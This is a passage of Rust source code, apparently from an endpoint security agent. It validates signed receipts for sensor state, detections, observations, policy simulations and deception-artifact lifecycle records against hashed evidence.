fn require_graph_slice_content_hash_evidence(
    evidence: &[EndpointReceiptEvidence],
    content_hash: Option<&str>,
) -> Result<()> {
    let content_hash =
        content_hash.ok_or_else(|| anyhow!("graph slice content hash is required"))?;
    require_evidence_value_hash(
        evidence,
        "contentHash",
        content_hash,
        "graph slice content hash evidence",
    )
}

fn require_graph_slice_evidence(
    evidence: &[EndpointReceiptEvidence],
    signed_graph_slice_id: Option<&str>,
    graph_slice_id: Option<&str>,
    root_node_id: Option<&str>,
    node_count: usize,
    edge_count: usize,
) -> Result<()> {
    let signed_graph_slice_id =
        signed_graph_slice_id.ok_or_else(|| anyhow!("graph slice signed id is required"))?;
    let graph_slice_id = graph_slice_id.ok_or_else(|| anyhow!("graph slice id is required"))?;
    let root_node_id =
        root_node_id.ok_or_else(|| anyhow!("graph slice root node id is required"))?;
    if signed_graph_slice_id != graph_slice_id {
        return Err(anyhow!(
            "graph slice signed id must match graph reference id"
        ));
    }
    require_evidence_value_hash(
        evidence,
        "graphSliceId",
        graph_slice_id,
        "graph slice id evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "rootNodeId",
        root_node_id,
        "graph slice root node evidence",
    )?;
    require_nonempty_hashed_evidence(evidence, "sliceKind", "graph slice kind evidence")?;
    require_evidence_value_hash(
        evidence,
        "nodeCount",
        node_count.to_string(),
        "graph slice node count evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "edgeCount",
        edge_count.to_string(),
        "graph slice edge count evidence",
    )
}

fn require_sensor_state_evidence(
    evidence: &[EndpointReceiptEvidence],
    decision: &EndpointDecisionRecord,
    actor: &EndpointDecisionActor,
    policy: &EndpointPolicySnapshot,
    sensor_state: &EndpointSensorState,
) -> Result<()> {
    let signed_id = decision
        .finding_id
        .as_deref()
        .ok_or_else(|| anyhow!("sensor state signed id is required"))?;
    let rule_id = decision
        .rule_id
        .as_deref()
        .ok_or_else(|| anyhow!("sensor state rule id is required"))?;
    if rule_id != "endpoint.sensor_state" {
        return Err(anyhow!("sensor state rule id is invalid"));
    }

    let provider_count = sensor_state.providers.len();
    let active_provider_count = sensor_state
        .providers
        .iter()
        .filter(|provider| provider.active)
        .count();
    let healthy_provider_count = sensor_state
        .providers
        .iter()
        .filter(|provider| provider.healthy)
        .count();
    let degraded_provider_count = sensor_state
        .providers
        .iter()
        .filter(|provider| provider.degraded)
        .count();
    let provider_ids = sensor_state
        .providers
        .iter()
        .map(|provider| provider.provider_id.as_str())
        .collect::<Vec<_>>()
        .join(",");
    let provider_count_text = provider_count.to_string();
    let active_count_text = active_provider_count.to_string();
    let healthy_count_text = healthy_provider_count.to_string();
    let degraded_count_text = degraded_provider_count.to_string();
    let sensor_state_hash = endpoint_sensor_state_content_hash(sensor_state);
    let policy_epoch = policy.policy_epoch.to_string();
    let expected_sensor_state_id = stable_id(
        "sensor_state",
        [
            actor.endpoint_id.as_str(),
            policy.policy_hash.as_str(),
            policy_epoch.as_str(),
            provider_count_text.as_str(),
            active_count_text.as_str(),
            healthy_count_text.as_str(),
            degraded_count_text.as_str(),
            provider_ids.as_str(),
            sensor_state_hash.as_str(),
        ],
    );
    if signed_id != expected_sensor_state_id {
        return Err(anyhow!(
            "sensor state id must match endpoint, policy, provider counts, degraded count, provider ids, and sensor state hash"
        ));
    }
    let expected_passed = provider_count > 0 && healthy_provider_count == provider_count;
    if decision.passed != expected_passed {
        return Err(anyhow!(
            "sensor state passed flag must match provider health"
        ));
    }

    require_nonempty_hashed_evidence(evidence, "reason", "sensor state reason evidence")?;
    require_evidence_value_hash(
        evidence,
        "providerCount",
        provider_count.to_string(),
        "sensor state provider count evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "activeProviderCount",
        active_count_text,
        "sensor state active-provider count evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "healthyProviderCount",
        healthy_count_text,
        "sensor state healthy-provider count evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "degradedProviderCount",
        degraded_provider_count.to_string(),
        "sensor state degraded-provider count evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "providerIds",
        provider_ids,
        "sensor state provider ids evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "sensorStateHash",
        sensor_state_hash,
        "sensor state content hash evidence",
    )
}

fn require_detection_evidence(
    evidence: &[EndpointReceiptEvidence],
    decision: &EndpointDecisionRecord,
    graph: &EndpointGraphReference,
) -> Result<()> {
    let observation_id = decision
        .observation_id
        .as_deref()
        .ok_or_else(|| anyhow!("detection observation id is required"))?;
    let finding_id = decision
        .finding_id
        .as_deref()
        .ok_or_else(|| anyhow!("detection finding id is required"))?;
    let rule_id = decision
        .rule_id
        .as_deref()
        .ok_or_else(|| anyhow!("detection rule id is required"))?;
    let title = decision
        .title
        .as_deref()
        .ok_or_else(|| anyhow!("detection title is required"))?;
    let severity = decision
        .severity
        .as_ref()
        .ok_or_else(|| anyhow!("detection severity is required"))?;
    let confidence = decision
        .confidence
        .ok_or_else(|| anyhow!("detection confidence is required"))?;
    let graph_slice_id = graph
        .graph_slice_id
        .as_deref()
        .ok_or_else(|| anyhow!("detection graph slice id is required"))?;
    let process_node_id = graph
        .process_node_id
        .as_deref()
        .ok_or_else(|| anyhow!("detection process node id is required"))?;
    require_detection_graph_reference(graph, observation_id, graph_slice_id, process_node_id)?;

    require_evidence_value_hash(
        evidence,
        "detectionFindingId",
        finding_id,
        "detection finding id evidence",
    )?;
    let expected_finding_id = detection_finding_id_from_signed_fields(rule_id, observation_id);
    if finding_id != expected_finding_id {
        return Err(anyhow!(
            "detection finding id must match signed rule and observation"
        ));
    }
    require_evidence_value_hash(
        evidence,
        "detectionObservationId",
        observation_id,
        "detection observation id evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "detectionRuleId",
        rule_id,
        "detection rule id evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "detectionTitle",
        title,
        "detection title evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "detectionSeverity",
        detection_severity_label(severity),
        "detection severity evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "detectionConfidence",
        confidence.to_string(),
        "detection confidence evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "detectionGraphSliceId",
        graph_slice_id,
        "detection graph slice evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "detectionProcessNodeId",
        process_node_id,
        "detection process node evidence",
    )
}

fn require_observation_evidence(
    evidence: &[EndpointReceiptEvidence],
    decision: &EndpointDecisionRecord,
    actor: &EndpointDecisionActor,
    policy: &EndpointPolicySnapshot,
    sensor_state: &EndpointSensorState,
    graph: &EndpointGraphReference,
) -> Result<()> {
    let observation_id = decision
        .observation_id
        .as_deref()
        .ok_or_else(|| anyhow!("observation id is required"))?;
    let receipt_id = decision
        .finding_id
        .as_deref()
        .ok_or_else(|| anyhow!("observation receipt id is required"))?;
    let rule_id = decision
        .rule_id
        .as_deref()
        .ok_or_else(|| anyhow!("observation receipt rule id is required"))?;
    let event_kind = rule_id
        .strip_prefix("endpoint.observation.")
        .ok_or_else(|| anyhow!("observation receipt rule id must include event kind"))?;
    require_nonempty(event_kind, "observation receipt event kind")?;
    let graph_slice_id = graph
        .graph_slice_id
        .as_deref()
        .ok_or_else(|| anyhow!("observation graph slice id is required"))?;
    let process_node_id = graph
        .process_node_id
        .as_deref()
        .ok_or_else(|| anyhow!("observation process node id is required"))?;
    require_detection_graph_reference(graph, observation_id, graph_slice_id, process_node_id)?;

    require_evidence_value_hash(
        evidence,
        "observationId",
        observation_id,
        "observation id evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "eventKind",
        event_kind,
        "observation event kind evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "observationHash",
        "observation content hash evidence",
    )?;
    require_nonempty_hashed_evidence(evidence, "target", "observation target evidence")?;
    require_evidence_value_hash(
        evidence,
        "graphSliceId",
        graph_slice_id,
        "observation graph slice evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "processNodeId",
        process_node_id,
        "observation process node evidence",
    )?;
    let provider_id_hash = evidence_value_hash(evidence, "providerId", "provider id evidence")?;
    let provider_kind_hash =
        evidence_value_hash(evidence, "providerKind", "provider kind evidence")?;
    let provider = sensor_state
        .providers
        .iter()
        .find(|provider| {
            let expected_provider_id_hash =
                sha256(provider.provider_id.as_bytes()).to_hex_prefixed();
            hex_strings_match(expected_provider_id_hash.as_str(), provider_id_hash)
        })
        .ok_or_else(|| anyhow!("observation receipt provider id is not present in sensor state"))?;
    let expected_provider_kind_hash =
        sha256(camel_debug_to_snake(format!("{:?}", provider.provider_kind).as_str()).as_bytes())
            .to_hex_prefixed();
    if !hex_strings_match(expected_provider_kind_hash.as_str(), provider_kind_hash) {
        return Err(anyhow!(
            "observation receipt provider kind evidence must match sensor state"
        ));
    }

    let expected_receipt_id = observation_receipt_id_from_evidence(
        actor.endpoint_id.as_str(),
        policy.policy_hash.as_str(),
        evidence,
    )?;
    if receipt_id != expected_receipt_id {
        return Err(anyhow!(
            "observation receipt id must match signed endpoint, policy, observation, graph, provider, target, and content-hash evidence"
        ));
    }
    Ok(())
}

fn require_detection_graph_reference(
    graph: &EndpointGraphReference,
    observation_id: &str,
    graph_slice_id: &str,
    process_node_id: &str,
) -> Result<()> {
    if !graph
        .node_ids
        .iter()
        .any(|node_id| node_id == process_node_id)
    {
        return Err(anyhow!(
            "detection process node reference must be included in graph node ids"
        ));
    }

    let node_count = graph.node_ids.len().to_string();
    let edge_count = graph.edge_ids.len().to_string();
    let expected_graph_slice_id = stable_id(
        "graph_slice",
        [
            observation_id,
            process_node_id,
            node_count.as_str(),
            edge_count.as_str(),
        ],
    );
    if graph_slice_id != expected_graph_slice_id {
        return Err(anyhow!(
            "detection graph slice reference must match observation, process, and graph counts"
        ));
    }
    Ok(())
}

fn detection_severity_label(severity: &DetectionSeverity) -> &'static str {
    match severity {
        DetectionSeverity::Info => "info",
        DetectionSeverity::Low => "low",
        DetectionSeverity::Medium => "medium",
        DetectionSeverity::High => "high",
        DetectionSeverity::Critical => "critical",
    }
}

fn detection_finding_id_from_signed_fields(rule_id: &str, observation_id: &str) -> String {
    stable_id("finding", [rule_id, observation_id])
}

fn observation_receipt_id_from_fields(
    endpoint_id: &str,
    policy_hash: &str,
    observation_id: &str,
    event_kind: &str,
    observation_hash: &str,
    target: &str,
    graph_slice_id: &str,
    process_node_id: &str,
    provider_id: &str,
    provider_kind: &str,
) -> String {
    let observation_id_hash = sha256(observation_id.as_bytes()).to_hex_prefixed();
    let event_kind_hash = sha256(event_kind.as_bytes()).to_hex_prefixed();
    let observation_hash_hash = sha256(observation_hash.as_bytes()).to_hex_prefixed();
    let target_hash = sha256(target.as_bytes()).to_hex_prefixed();
    let graph_slice_id_hash = sha256(graph_slice_id.as_bytes()).to_hex_prefixed();
    let process_node_id_hash = sha256(process_node_id.as_bytes()).to_hex_prefixed();
    let provider_id_hash = sha256(provider_id.as_bytes()).to_hex_prefixed();
    let provider_kind_hash = sha256(provider_kind.as_bytes()).to_hex_prefixed();
    observation_receipt_id_from_evidence_hashes(
        endpoint_id,
        policy_hash,
        ObservationReceiptIdEvidenceHashes {
            observation_id_hash: observation_id_hash.as_str(),
            event_kind_hash: event_kind_hash.as_str(),
            observation_hash_hash: observation_hash_hash.as_str(),
            target_hash: target_hash.as_str(),
            graph_slice_id_hash: graph_slice_id_hash.as_str(),
            process_node_id_hash: process_node_id_hash.as_str(),
            provider_id_hash: provider_id_hash.as_str(),
            provider_kind_hash: provider_kind_hash.as_str(),
        },
    )
}

fn observation_receipt_id_from_evidence(
    endpoint_id: &str,
    policy_hash: &str,
    evidence: &[EndpointReceiptEvidence],
) -> Result<String> {
    Ok(observation_receipt_id_from_evidence_hashes(
        endpoint_id,
        policy_hash,
        ObservationReceiptIdEvidenceHashes {
            observation_id_hash: evidence_value_hash(
                evidence,
                "observationId",
                "observation id evidence",
            )?,
            event_kind_hash: evidence_value_hash(
                evidence,
                "eventKind",
                "observation event kind evidence",
            )?,
            observation_hash_hash: evidence_value_hash(
                evidence,
                "observationHash",
                "observation content hash evidence",
            )?,
            target_hash: evidence_value_hash(evidence, "target", "observation target evidence")?,
            graph_slice_id_hash: evidence_value_hash(
                evidence,
                "graphSliceId",
                "observation graph slice evidence",
            )?,
            process_node_id_hash: evidence_value_hash(
                evidence,
                "processNodeId",
                "observation process node evidence",
            )?,
            provider_id_hash: evidence_value_hash(evidence, "providerId", "provider id evidence")?,
            provider_kind_hash: evidence_value_hash(
                evidence,
                "providerKind",
                "provider kind evidence",
            )?,
        },
    ))
}

struct ObservationReceiptIdEvidenceHashes<'a> {
    observation_id_hash: &'a str,
    event_kind_hash: &'a str,
    observation_hash_hash: &'a str,
    target_hash: &'a str,
    graph_slice_id_hash: &'a str,
    process_node_id_hash: &'a str,
    provider_id_hash: &'a str,
    provider_kind_hash: &'a str,
}

fn observation_receipt_id_from_evidence_hashes(
    endpoint_id: &str,
    policy_hash: &str,
    evidence_hashes: ObservationReceiptIdEvidenceHashes<'_>,
) -> String {
    stable_id(
        "observation_receipt",
        [
            endpoint_id,
            policy_hash,
            evidence_hashes.observation_id_hash,
            evidence_hashes.event_kind_hash,
            evidence_hashes.observation_hash_hash,
            evidence_hashes.target_hash,
            evidence_hashes.graph_slice_id_hash,
            evidence_hashes.process_node_id_hash,
            evidence_hashes.provider_id_hash,
            evidence_hashes.provider_kind_hash,
        ],
    )
}

fn graph_policy_simulation_id_from_signed_fields(
    root_node_id: &str,
    graph_slice_id: &str,
    rule_id: &str,
    action: &EndpointDecisionAction,
    breakage_score: u8,
) -> String {
    let breakage_score = breakage_score.to_string();
    stable_id(
        "policy_simulation",
        [
            root_node_id,
            graph_slice_id,
            rule_id,
            action.as_str(),
            breakage_score.as_str(),
        ],
    )
}

fn require_policy_decision_evidence(
    evidence: &[EndpointReceiptEvidence],
    decision: &EndpointDecisionRecord,
    actor: &EndpointDecisionActor,
    policy: &EndpointPolicySnapshot,
) -> Result<()> {
    let signed_id = decision
        .finding_id
        .as_deref()
        .ok_or_else(|| anyhow!("policy decision signed id is required"))?;
    let rule_id = decision
        .rule_id
        .as_deref()
        .ok_or_else(|| anyhow!("policy decision rule id is required"))?;
    let action_type = rule_id
        .strip_prefix("endpoint.policy_decision.")
        .ok_or_else(|| anyhow!("policy decision rule id must include action type"))?;
    require_nonempty(action_type, "policy decision action type")?;
    require_evidence_value_hash(
        evidence,
        "actionType",
        action_type,
        "policy decision action type evidence",
    )?;
    require_nonempty_hashed_evidence(evidence, "target", "policy decision target evidence")?;
    require_evidence_value_hash(
        evidence,
        "allowed",
        decision.passed.to_string(),
        "policy decision allowed evidence",
    )?;
    require_nonempty_hashed_evidence(evidence, "guard", "policy decision guard evidence")?;
    let expected_decision_id = policy_decision_id_from_evidence(
        evidence,
        actor.endpoint_id.as_str(),
        policy.policy_hash.as_str(),
        action_type,
        decision.passed,
    )?;
    if signed_id != expected_decision_id {
        return Err(anyhow!(
            "policy decision id must match signed endpoint, policy, action, target, allowed, and guard evidence"
        ));
    }
    if evidence.iter().any(|item| item.key == "severity") {
        require_nonempty_hashed_evidence(
            evidence,
            "severity",
            "policy decision severity evidence",
        )?;
    }
    if evidence.iter().any(|item| item.key == "message") {
        require_nonempty_hashed_evidence(evidence, "message", "policy decision message evidence")?;
    }
    if evidence.iter().any(|item| item.key == "details") {
        require_nonempty_hashed_evidence(evidence, "details", "policy decision details evidence")?;
    }
    Ok(())
}

fn require_simulation_evidence(
    evidence: &[EndpointReceiptEvidence],
    decision: &EndpointDecisionRecord,
    graph: &EndpointGraphReference,
    policy: &EndpointPolicySnapshot,
) -> Result<()> {
    let rule_id = decision
        .rule_id
        .as_deref()
        .ok_or_else(|| anyhow!("simulation rule id is required"))?;
    match rule_id {
        "endpoint.policy_event_replay" => require_policy_event_replay_evidence(
            evidence,
            decision.finding_id.as_deref(),
            graph,
            policy,
        ),
        "endpoint.policy_event_impact" => require_policy_event_impact_evidence(
            evidence,
            decision.finding_id.as_deref(),
            graph,
            policy,
        ),
        _ => require_graph_policy_simulation_evidence(evidence, decision, graph),
    }
}

fn require_graph_policy_simulation_evidence(
    evidence: &[EndpointReceiptEvidence],
    decision: &EndpointDecisionRecord,
    graph: &EndpointGraphReference,
) -> Result<()> {
    let simulation_id = decision
        .finding_id
        .as_deref()
        .ok_or_else(|| anyhow!("simulation signed id is required"))?;
    let root_node_id = graph
        .process_node_id
        .as_deref()
        .ok_or_else(|| anyhow!("simulation root node id is required"))?;
    let graph_slice_id = graph
        .graph_slice_id
        .as_deref()
        .ok_or_else(|| anyhow!("simulation graph slice id is required"))?;
    let content_hash = graph
        .content_hash
        .as_deref()
        .ok_or_else(|| anyhow!("simulation graph content hash is required"))?;
    let breakage_score = simulation_breakage_score_from_confidence(decision.confidence)?;
    require_subgraph_reference(graph, "simulation")?;

    require_evidence_value_hash(
        evidence,
        "simulationId",
        simulation_id,
        "simulation id evidence",
    )?;
    let expected_simulation_id = graph_policy_simulation_id_from_signed_fields(
        root_node_id,
        graph_slice_id,
        decision
            .rule_id
            .as_deref()
            .ok_or_else(|| anyhow!("simulation rule id is required"))?,
        &decision.action,
        breakage_score,
    );
    if simulation_id != expected_simulation_id {
        return Err(anyhow!(
            "simulation id must match signed root, graph slice, rule, action, and breakage score"
        ));
    }
    require_evidence_value_hash(
        evidence,
        "rootNodeId",
        root_node_id,
        "simulation root node evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "graphSliceId",
        graph_slice_id,
        "simulation graph slice evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "wouldBlock",
        simulation_action_would_block(&decision.action).to_string(),
        "simulation would-block evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "developerBreakageScore",
        breakage_score.to_string(),
        "simulation breakage score evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "impactLevel",
        impact_level_for_score(breakage_score).as_str(),
        "simulation impact level evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "affectedNodeCount",
        graph.node_ids.len().to_string(),
        "simulation affected-node count evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "affectedEdgeCount",
        graph.edge_ids.len().to_string(),
        "simulation affected-edge count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "affectedIdentityContext",
        "simulation affected identity context evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "affectedToolContext",
        "simulation affected tool context evidence",
    )?;
    require_evidence_value_hash(
        evidence,
        "contentHash",
        content_hash,
        "simulation content hash evidence",
    )
}

fn simulation_breakage_score_from_confidence(confidence: Option<f32>) -> Result<u8> {
    let confidence = confidence.ok_or_else(|| anyhow!("simulation confidence is required"))?;
    let score = confidence * 100.0;
    let rounded = score.round();
    if !(0.0..=100.0).contains(&rounded) || (score - rounded).abs() > 0.001 {
        return Err(anyhow!(
            "simulation confidence must encode a whole-number breakage score"
        ));
    }
    Ok(rounded as u8)
}

fn require_policy_event_replay_evidence(
    evidence: &[EndpointReceiptEvidence],
    replay_id: Option<&str>,
    graph: &EndpointGraphReference,
    policy: &EndpointPolicySnapshot,
) -> Result<()> {
    let replay_id =
        replay_id.ok_or_else(|| anyhow!("policy event replay signed id is required"))?;
    require_policy_event_stream_graph_reference(graph, replay_id, "policy event replay")?;
    require_evidence_value_hash(
        evidence,
        "replayId",
        replay_id,
        "policy event replay id evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "eventStreamHash",
        "policy event replay stream hash evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "resultHash",
        "policy event replay result hash evidence",
    )?;
    require_nonempty_hashed_evidence(evidence, "eventCount", "policy event replay count evidence")?;
    require_nonempty_hashed_evidence(
        evidence,
        "allowedCount",
        "policy event replay allowed count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "warnCount",
        "policy event replay warn count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "blockedCount",
        "policy event replay blocked count evidence",
    )?;
    require_boolean_hashed_evidence(
        evidence,
        "trackPosture",
        "policy event replay posture evidence",
    )?;
    let expected_replay_id = policy_event_replay_id_from_evidence(policy, evidence)?;
    if replay_id != expected_replay_id {
        return Err(anyhow!(
            "policy event replay id must match signed policy, stream, result, count, and posture evidence"
        ));
    }
    Ok(())
}

fn require_policy_event_impact_evidence(
    evidence: &[EndpointReceiptEvidence],
    impact_id: Option<&str>,
    graph: &EndpointGraphReference,
    policy: &EndpointPolicySnapshot,
) -> Result<()> {
    let impact_id =
        impact_id.ok_or_else(|| anyhow!("policy event impact signed id is required"))?;
    require_policy_event_stream_graph_reference(graph, impact_id, "policy event impact")?;
    require_evidence_value_hash(
        evidence,
        "impactId",
        impact_id,
        "policy event impact id evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "eventStreamHash",
        "policy event impact stream hash evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "currentResultHash",
        "policy event impact current-result evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "proposedResultHash",
        "policy event impact proposed-result evidence",
    )?;
    require_nonempty_hashed_evidence(evidence, "impactHash", "policy event impact hash evidence")?;
    require_nonempty_hashed_evidence(
        evidence,
        "proposedPolicyHash",
        "policy event impact proposed-policy hash evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "proposedPolicyEpoch",
        "policy event impact proposed-policy epoch evidence",
    )?;
    require_nonempty_hashed_evidence(evidence, "eventCount", "policy event impact count evidence")?;
    require_nonempty_hashed_evidence(
        evidence,
        "changedCount",
        "policy event impact changed count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "allowToBlockCount",
        "policy event impact allow-to-block count evidence",
    )?;
    require_boolean_hashed_evidence(
        evidence,
        "trackPosture",
        "policy event impact posture evidence",
    )?;
    let expected_impact_id = policy_event_impact_id_from_evidence(policy, evidence)?;
    if impact_id != expected_impact_id {
        return Err(anyhow!(
            "policy event impact id must match signed policy, proposed policy, stream, result, impact, count, and posture evidence"
        ));
    }
    Ok(())
}

fn policy_event_replay_id_from_evidence(
    policy: &EndpointPolicySnapshot,
    evidence: &[EndpointReceiptEvidence],
) -> Result<String> {
    let policy_epoch = policy.policy_epoch.to_string();
    Ok(stable_id(
        "policy_event_replay",
        [
            policy.policy_hash.as_str(),
            policy_epoch.as_str(),
            evidence_value_hash(
                evidence,
                "eventStreamHash",
                "policy event replay stream hash evidence",
            )?,
            evidence_value_hash(
                evidence,
                "resultHash",
                "policy event replay result hash evidence",
            )?,
            evidence_value_hash(evidence, "eventCount", "policy event replay count evidence")?,
            evidence_value_hash(
                evidence,
                "allowedCount",
                "policy event replay allowed count evidence",
            )?,
            evidence_value_hash(
                evidence,
                "warnCount",
                "policy event replay warn count evidence",
            )?,
            evidence_value_hash(
                evidence,
                "blockedCount",
                "policy event replay blocked count evidence",
            )?,
            evidence_value_hash(
                evidence,
                "trackPosture",
                "policy event replay posture evidence",
            )?,
        ],
    ))
}

fn policy_event_impact_id_from_evidence(
    policy: &EndpointPolicySnapshot,
    evidence: &[EndpointReceiptEvidence],
) -> Result<String> {
    let policy_epoch = policy.policy_epoch.to_string();
    Ok(stable_id(
        "policy_event_impact",
        [
            policy.policy_hash.as_str(),
            policy_epoch.as_str(),
            evidence_value_hash(
                evidence,
                "proposedPolicyHash",
                "policy event impact proposed-policy hash evidence",
            )?,
            evidence_value_hash(
                evidence,
                "proposedPolicyEpoch",
                "policy event impact proposed-policy epoch evidence",
            )?,
            evidence_value_hash(
                evidence,
                "eventStreamHash",
                "policy event impact stream hash evidence",
            )?,
            evidence_value_hash(
                evidence,
                "currentResultHash",
                "policy event impact current-result evidence",
            )?,
            evidence_value_hash(
                evidence,
                "proposedResultHash",
                "policy event impact proposed-result evidence",
            )?,
            evidence_value_hash(evidence, "impactHash", "policy event impact hash evidence")?,
            evidence_value_hash(evidence, "eventCount", "policy event impact count evidence")?,
            evidence_value_hash(
                evidence,
                "changedCount",
                "policy event impact changed count evidence",
            )?,
            evidence_value_hash(
                evidence,
                "allowToBlockCount",
                "policy event impact allow-to-block count evidence",
            )?,
            evidence_value_hash(
                evidence,
                "trackPosture",
                "policy event impact posture evidence",
            )?,
        ],
    ))
}

fn require_policy_event_stream_graph_reference(
    graph: &EndpointGraphReference,
    stream_id: &str,
    label: &str,
) -> Result<()> {
    let graph_slice_id = graph
        .graph_slice_id
        .as_deref()
        .ok_or_else(|| anyhow!("{label} graph slice reference is required"))?;
    if graph_slice_id != stream_id {
        return Err(anyhow!(
            "{label} graph slice reference must match signed id"
        ));
    }
    let process_node_id = graph
        .process_node_id
        .as_deref()
        .ok_or_else(|| anyhow!("{label} stream node reference is required"))?;
    if process_node_id != "policy_event_stream" {
        return Err(anyhow!(
            "{label} stream node reference must be policy_event_stream"
        ));
    }
    if !graph
        .node_ids
        .iter()
        .any(|node_id| node_id == "policy_event_stream")
    {
        return Err(anyhow!(
            "{label} stream node reference must be included in graph node ids"
        ));
    }
    Ok(())
}

fn require_deception_materialization_evidence(
    evidence: &[EndpointReceiptEvidence],
    actor: &EndpointDecisionActor,
    policy: &EndpointPolicySnapshot,
    signed_materialization_id: Option<&str>,
) -> Result<()> {
    require_evidence_value_hash(
        evidence,
        "endpointId",
        actor.endpoint_id.as_str(),
        "deception materialization endpoint evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "deceptionPlanRoot",
        "deception materialization plan root evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "deceptionPlanHash",
        "deception materialization plan hash evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "materializationReportHash",
        "deception materialization report hash evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "artifactCount",
        "deception materialization artifact count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "createdCount",
        "deception materialization created count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "skippedCount",
        "deception materialization skipped count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "registeredArtifactCount",
        "deception materialization registered artifact count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "artifactIds",
        "deception materialization artifact ids evidence",
    )?;
    let materialization_id = deception_materialization_id_from_evidence(
        evidence,
        actor.endpoint_id.as_str(),
        policy.policy_hash.as_str(),
    )?;
    if signed_materialization_id != Some(materialization_id.as_str()) {
        return Err(anyhow!(
            "deception materialization id must match signed plan root, plan, report, count, and artifact evidence"
        ));
    }
    Ok(())
}

fn require_deception_cleanup_evidence(
    evidence: &[EndpointReceiptEvidence],
    decision: &EndpointDecisionRecord,
    actor: &EndpointDecisionActor,
    policy: &EndpointPolicySnapshot,
    signed_cleanup_id: Option<&str>,
) -> Result<()> {
    require_evidence_value_hash(
        evidence,
        "endpointId",
        actor.endpoint_id.as_str(),
        "deception cleanup endpoint evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "deceptionPlanRoot",
        "deception cleanup plan root evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "deceptionPlanHash",
        "deception cleanup plan hash evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "cleanupReportHash",
        "deception cleanup report hash evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "artifactCount",
        "deception cleanup artifact count evidence",
    )?;
    let dry_run = deception_cleanup_dry_run_from_decision(decision)?;
    require_evidence_value_hash(
        evidence,
        "dryRun",
        dry_run.to_string(),
        "deception cleanup dry-run evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "removedCount",
        "deception cleanup removed count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "wouldRemoveCount",
        "deception cleanup would-remove count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "missingCount",
        "deception cleanup missing count evidence",
    )?;
    let refused_count = evidence
        .iter()
        .find(|item| item.key == "refusedCount")
        .ok_or_else(|| anyhow!("deception cleanup refused count evidence is required"))?;
    require_evidence_hash_not_empty(refused_count, "deception cleanup refused count evidence")?;
    let zero_refused_hash = sha256(b"0").to_hex_prefixed();
    let refused_count_is_zero = hex_strings_match(
        zero_refused_hash.as_str(),
        refused_count.value_hash.as_str(),
    );
    if decision.passed != refused_count_is_zero {
        return Err(anyhow!(
            "deception cleanup refused count evidence hash must match signed pass state"
        ));
    }
    require_nonempty_hashed_evidence(
        evidence,
        "deregisteredArtifactCount",
        "deception cleanup deregistered artifact count evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "remainingRegisteredArtifactCount",
        "deception cleanup remaining registered artifact count evidence",
    )?;
    let cleanup_id = deception_cleanup_id_from_evidence(
        evidence,
        actor.endpoint_id.as_str(),
        policy.policy_hash.as_str(),
    )?;
    if signed_cleanup_id != Some(cleanup_id.as_str()) {
        return Err(anyhow!(
            "deception cleanup id must match signed plan root, plan, report, mode, count, and registry evidence"
        ));
    }
    Ok(())
}

fn deception_cleanup_dry_run_from_decision(decision: &EndpointDecisionRecord) -> Result<bool> {
    let title = decision
        .title
        .as_deref()
        .ok_or_else(|| anyhow!("deception cleanup title is required"))?;
    match title {
        "Endpoint deception cleanup dry run planned" => Ok(true),
        "Endpoint deception cleanup executed" => Ok(false),
        _ => Err(anyhow!("deception cleanup title is invalid")),
    }
}

fn require_deception_rotation_evidence(
    evidence: &[EndpointReceiptEvidence],
    decision: &EndpointDecisionRecord,
    actor: &EndpointDecisionActor,
    policy: &EndpointPolicySnapshot,
    signed_rotation_id: Option<&str>,
) -> Result<()> {
    require_evidence_value_hash(
        evidence,
        "endpointId",
        actor.endpoint_id.as_str(),
        "deception rotation endpoint evidence",
    )?;
    require_nonempty_hashed_evidence(
        evidence,
        "oldDeceptionPlanRoot",
